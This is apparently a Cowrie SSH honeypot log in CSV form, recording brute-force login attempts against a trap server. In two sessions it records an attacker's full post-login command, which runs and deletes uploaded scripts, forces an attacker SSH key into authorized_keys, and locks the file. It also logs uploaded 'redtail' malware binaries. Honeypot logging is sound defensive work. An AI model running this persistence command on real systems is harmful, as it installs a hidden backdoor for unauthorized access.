eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.login.failed,161.35.192.83,,,,23e872c1b739,,,,,login attempt [pbsdata/pbsdata] failed,localhost,2024-11-14T18:37:22.832773Z
cowrie.session.closed,161.35.192.83,,,,23e872c1b739,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:37:23.983545Z
cowrie.session.connect,161.35.192.83,53640,172.233.154.19,2222,127617affe44,ssh,,,,New connection: 161.35.192.83:53640 (172.233.154.19:2222) [session: 127617affe44],localhost,2024-11-14T18:41:37.467257Z
cowrie.client.version,161.35.192.83,,,,127617affe44,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T18:41:37.468094Z
cowrie.client.kex,161.35.192.83,,,,127617affe44,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T18:41:37.616759Z
cowrie.login.failed,161.35.192.83,,,,127617affe44,,,,,login attempt [pbsdata/123] failed,localhost,2024-11-14T18:41:38.252763Z
cowrie.session.closed,161.35.192.83,,,,127617affe44,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:41:39.404085Z
cowrie.session.connect,161.35.192.83,46508,172.233.154.19,2222,72198fae505e,ssh,,,,New connection: 161.35.192.83:46508 (172.233.154.19:2222) [session: 72198fae505e],localhost,2024-11-14T18:45:50.340250Z
cowrie.client.version,161.35.192.83,,,,72198fae505e,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T18:45:50.340992Z
cowrie.client.kex,161.35.192.83,,,,72198fae505e,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T18:45:50.488709Z
cowrie.login.failed,161.35.192.83,,,,72198fae505e,,,,,login attempt [pbsdata/123456] failed,localhost,2024-11-14T18:45:51.120937Z
cowrie.session.closed,161.35.192.83,,,,72198fae505e,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:45:52.272327Z
cowrie.session.connect,206.189.6.168,38362,172.233.154.19,2222,21cb114fbad3,ssh,,,,New connection: 206.189.6.168:38362 (172.233.154.19:2222) [session: 21cb114fbad3],localhost,2024-11-14T18:47:00.907756Z
cowrie.session.closed,206.189.6.168,,,,21cb114fbad3,,,,,Connection lost after 0 seconds,localhost,2024-11-14T18:47:01.121311Z
cowrie.session.connect,161.35.192.83,39376,172.233.154.19,2222,a3e99fa70e8d,ssh,,,,New connection: 161.35.192.83:39376 (172.233.154.19:2222) [session: a3e99fa70e8d],localhost,2024-11-14T18:50:00.719813Z
cowrie.client.version,161.35.192.83,,,,a3e99fa70e8d,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T18:50:00.720972Z
cowrie.client.kex,161.35.192.83,,,,a3e99fa70e8d,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T18:50:00.883516Z
cowrie.login.failed,161.35.192.83,,,,a3e99fa70e8d,,,,,login attempt [pbsdata/password] failed,localhost,2024-11-14T18:50:01.665411Z
cowrie.session.closed,161.35.192.83,,,,a3e99fa70e8d,,,,,Connection lost after 2 seconds,localhost,2024-11-14T18:50:02.836391Z
cowrie.session.connect,45.148.10.240,52982,172.233.154.19,2222,9347d8df76d2,ssh,,,,New connection: 45.148.10.240:52982 (172.233.154.19:2222) [session: 9347d8df76d2],localhost,2024-11-14T18:51:58.033375Z
cowrie.session.closed,45.148.10.240,,,,9347d8df76d2,,,,,Connection lost after 0 seconds,localhost,2024-11-14T18:51:58.168948Z
cowrie.session.connect,79.137.202.88,44126,172.233.154.19,2222,680f2175debd,ssh,,,,New connection: 79.137.202.88:44126 (172.233.154.19:2222) [session: 680f2175debd],localhost,2024-11-14T18:52:09.758604Z
cowrie.client.version,79.137.202.88,,,,680f2175debd,,SSH-2.0-libssh2_1.8.0,,,Remote SSH version: SSH-2.0-libssh2_1.8.0,localhost,2024-11-14T18:52:09.759264Z
cowrie.client.kex,79.137.202.88,,,,680f2175debd,,,a7a87fbe86774c2e40cc4a7ea2ab1b3c,"diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none",SSH client hassh fingerprint: a7a87fbe86774c2e40cc4a7ea2ab1b3c,localhost,2024-11-14T18:52:09.909613Z
cowrie.login.success,79.137.202.88,,,,680f2175debd,,,,,login attempt [root/admin] succeeded,localhost,2024-11-14T18:52:10.765960Z
cowrie.session.params,79.137.202.88,,,,680f2175debd,,,,,[],localhost,2024-11-14T18:52:11.088367Z
cowrie.command.input,79.137.202.88,,,,680f2175debd,,,,,CMD: uname -a,localhost,2024-11-14T18:52:11.088733Z
cowrie.log.closed,79.137.202.88,,,,680f2175debd,,,,,Closing TTY Log: var/lib/cowrie/tty/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15 after 0 seconds,localhost,2024-11-14T18:52:11.240629Z
cowrie.session.closed,79.137.202.88,,,,680f2175debd,,,,,Connection lost after 79 seconds,localhost,2024-11-14T18:53:28.902772Z
cowrie.session.connect,206.189.6.168,57862,172.233.154.19,2222,8f2cea850da2,ssh,,,,New connection: 206.189.6.168:57862 (172.233.154.19:2222) [session: 8f2cea850da2],localhost,2024-11-14T18:53:47.808092Z
cowrie.session.closed,206.189.6.168,,,,8f2cea850da2,,,,,Connection lost after 0 seconds,localhost,2024-11-14T18:53:47.967900Z
cowrie.session.connect,161.35.192.83,60474,172.233.154.19,2222,ed7a71b99456,ssh,,,,New connection: 161.35.192.83:60474 (172.233.154.19:2222) [session: ed7a71b99456],localhost,2024-11-14T18:54:17.289157Z
cowrie.client.version,161.35.192.83,,,,ed7a71b99456,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T18:54:17.289827Z
cowrie.client.kex,161.35.192.83,,,,ed7a71b99456,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T18:54:17.443666Z
cowrie.login.failed,161.35.192.83,,,,ed7a71b99456,,,,,login attempt [aaa/aaa] failed,localhost,2024-11-14T18:54:18.099792Z
cowrie.session.closed,161.35.192.83,,,,ed7a71b99456,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:54:19.256302Z
cowrie.session.connect,92.255.85.107,13971,172.233.154.19,2222,87c498e825d0,ssh,,,,New connection: 92.255.85.107:13971 (172.233.154.19:2222) [session: 87c498e825d0],localhost,2024-11-14T18:54:37.669584Z
cowrie.client.version,92.255.85.107,,,,87c498e825d0,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T18:54:37.670194Z
cowrie.client.kex,92.255.85.107,,,,87c498e825d0,,,c3a948709cdbcfce6ee341735b6d74a2,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: c3a948709cdbcfce6ee341735b6d74a2,localhost,2024-11-14T18:54:37.839423Z
cowrie.login.failed,92.255.85.107,,,,87c498e825d0,,,,,login attempt [admin/abcd1234] failed,localhost,2024-11-14T18:54:38.392822Z
cowrie.session.closed,92.255.85.107,,,,87c498e825d0,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:54:39.564387Z
cowrie.session.connect,103.249.84.137,40524,172.233.154.19,2222,afa044f42e3a,ssh,,,,New connection: 103.249.84.137:40524 (172.233.154.19:2222) [session: afa044f42e3a],localhost,2024-11-14T18:57:21.612931Z
cowrie.client.version,103.249.84.137,,,,afa044f42e3a,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-14T18:57:21.613516Z
cowrie.client.kex,103.249.84.137,,,,afa044f42e3a,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-14T18:57:21.816304Z
cowrie.login.success,103.249.84.137,,,,afa044f42e3a,,,,,login attempt [root/qwer123.com] succeeded,localhost,2024-11-14T18:57:22.652279Z
cowrie.session.closed,103.249.84.137,,,,afa044f42e3a,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:57:22.858623Z
cowrie.session.connect,87.120.113.231,42130,172.233.154.19,2222,2037e6876538,ssh,,,,New connection: 87.120.113.231:42130 (172.233.154.19:2222) [session: 2037e6876538],localhost,2024-11-14T18:57:23.070706Z
cowrie.client.version,87.120.113.231,,,,2037e6876538,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T18:57:23.071316Z
cowrie.client.kex,87.120.113.231,,,,2037e6876538,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-14T18:57:23.215159Z
cowrie.login.success,87.120.113.231,,,,2037e6876538,,,,,login attempt [root/qwer123.com] succeeded,localhost,2024-11-14T18:57:23.651735Z
cowrie.session.connect,143.198.145.81,57458,172.233.154.19,2222,86eccdba1d90,ssh,,,,New connection: 143.198.145.81:57458 (172.233.154.19:2222) [session: 86eccdba1d90],localhost,2024-11-14T18:57:35.972272Z
cowrie.session.closed,143.198.145.81,,,,86eccdba1d90,,,,,Connection lost after 0 seconds,localhost,2024-11-14T18:57:35.982819Z
cowrie.session.connect,178.128.229.153,43748,172.233.154.19,2222,060954293324,ssh,,,,New connection: 178.128.229.153:43748 (172.233.154.19:2222) [session: 060954293324],localhost,2024-11-14T18:57:53.420050Z
cowrie.session.closed,178.128.229.153,,,,060954293324,,,,,Connection lost after 0 seconds,localhost,2024-11-14T18:57:53.521674Z
cowrie.session.params,87.120.113.231,,,,2037e6876538,,,,,[],localhost,2024-11-14T18:57:55.535105Z
cowrie.command.input,87.120.113.231,,,,2037e6876538,,,,,"CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",localhost,2024-11-14T18:57:55.535496Z
cowrie.session.file_download,87.120.113.231,,,,2037e6876538,,,,,Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b,localhost,2024-11-14T18:57:55.681850Z
cowrie.log.closed,87.120.113.231,,,,2037e6876538,,,,,Closing TTY Log: var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6 after 0 seconds,localhost,2024-11-14T18:57:55.682367Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""clean.sh"" to var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",localhost,2024-11-14T18:57:55.683025Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""redtail.arm7"" to var/lib/cowrie/downloads/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4",localhost,2024-11-14T18:57:55.685150Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""redtail.arm8"" to var/lib/cowrie/downloads/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472",localhost,2024-11-14T18:57:55.687455Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""redtail.i686"" to var/lib/cowrie/downloads/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586",localhost,2024-11-14T18:57:55.689487Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""redtail.x86_64"" to var/lib/cowrie/downloads/29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b",localhost,2024-11-14T18:57:55.692264Z
cowrie.session.file_upload,87.120.113.231,,,,2037e6876538,,,,,"SFTP Uploaded file ""setup.sh"" to var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae",localhost,2024-11-14T18:57:55.693321Z
cowrie.session.closed,87.120.113.231,,,,2037e6876538,,,,,Connection lost after 32 seconds,localhost,2024-11-14T18:57:55.693958Z
cowrie.session.connect,161.35.192.83,53366,172.233.154.19,2222,90ce7f983db6,ssh,,,,New connection: 161.35.192.83:53366 (172.233.154.19:2222) [session: 90ce7f983db6],localhost,2024-11-14T18:58:32.202598Z
cowrie.client.version,161.35.192.83,,,,90ce7f983db6,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T18:58:32.203321Z
cowrie.client.kex,161.35.192.83,,,,90ce7f983db6,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T18:58:32.352992Z
cowrie.login.failed,161.35.192.83,,,,90ce7f983db6,,,,,login attempt [aaa/123] failed,localhost,2024-11-14T18:58:32.991609Z
cowrie.session.closed,161.35.192.83,,,,90ce7f983db6,,,,,Connection lost after 1 seconds,localhost,2024-11-14T18:58:34.143658Z
cowrie.session.connect,161.35.192.83,46240,172.233.154.19,2222,14ed19266515,ssh,,,,New connection: 161.35.192.83:46240 (172.233.154.19:2222) [session: 14ed19266515],localhost,2024-11-14T19:02:54.494452Z
cowrie.client.version,161.35.192.83,,,,14ed19266515,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T19:02:54.495066Z
cowrie.client.kex,161.35.192.83,,,,14ed19266515,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T19:02:54.661132Z
cowrie.login.failed,161.35.192.83,,,,14ed19266515,,,,,login attempt [aaa/123456] failed,localhost,2024-11-14T19:02:55.365322Z
cowrie.session.closed,161.35.192.83,,,,14ed19266515,,,,,Connection lost after 2 seconds,localhost,2024-11-14T19:02:56.533342Z
cowrie.session.connect,161.35.192.83,39122,172.233.154.19,2222,494f55d82d27,ssh,,,,New connection: 161.35.192.83:39122 (172.233.154.19:2222) [session: 494f55d82d27],localhost,2024-11-14T19:07:11.988446Z
cowrie.client.version,161.35.192.83,,,,494f55d82d27,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T19:07:11.989144Z
cowrie.client.kex,161.35.192.83,,,,494f55d82d27,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T19:07:12.148389Z
cowrie.login.failed,161.35.192.83,,,,494f55d82d27,,,,,login attempt [aaa/password] failed,localhost,2024-11-14T19:07:12.825846Z
cowrie.session.closed,161.35.192.83,,,,494f55d82d27,,,,,Connection lost after 1 seconds,localhost,2024-11-14T19:07:13.976327Z
cowrie.session.connect,142.93.210.218,46386,172.233.154.19,2222,e03abd91d5fe,ssh,,,,New connection: 142.93.210.218:46386 (172.233.154.19:2222) [session: e03abd91d5fe],localhost,2024-11-14T19:08:21.265045Z
cowrie.client.version,142.93.210.218,,,,e03abd91d5fe,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-14T19:08:21.268226Z
cowrie.client.kex,142.93.210.218,,,,e03abd91d5fe,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-14T19:08:21.481228Z
cowrie.login.success,142.93.210.218,,,,e03abd91d5fe,,,,,login attempt [root/abc123123] succeeded,localhost,2024-11-14T19:08:22.336356Z
cowrie.session.closed,142.93.210.218,,,,e03abd91d5fe,,,,,Connection lost after 1 seconds,localhost,2024-11-14T19:08:22.552820Z
cowrie.session.connect,87.120.113.231,42656,172.233.154.19,2222,fbb9ef873372,ssh,,,,New connection: 87.120.113.231:42656 (172.233.154.19:2222) [session: fbb9ef873372],localhost,2024-11-14T19:08:22.745042Z
cowrie.client.version,87.120.113.231,,,,fbb9ef873372,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T19:08:22.745625Z
cowrie.client.kex,87.120.113.231,,,,fbb9ef873372,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-14T19:08:22.888995Z
cowrie.login.success,87.120.113.231,,,,fbb9ef873372,,,,,login attempt [root/abc123123] succeeded,localhost,2024-11-14T19:08:23.331069Z
cowrie.session.params,87.120.113.231,,,,fbb9ef873372,,,,,[],localhost,2024-11-14T19:08:51.851725Z
cowrie.command.input,87.120.113.231,,,,fbb9ef873372,,,,,"CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",localhost,2024-11-14T19:08:51.852282Z
cowrie.session.file_download,87.120.113.231,,,,fbb9ef873372,,,,,Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b,localhost,2024-11-14T19:08:52.000024Z
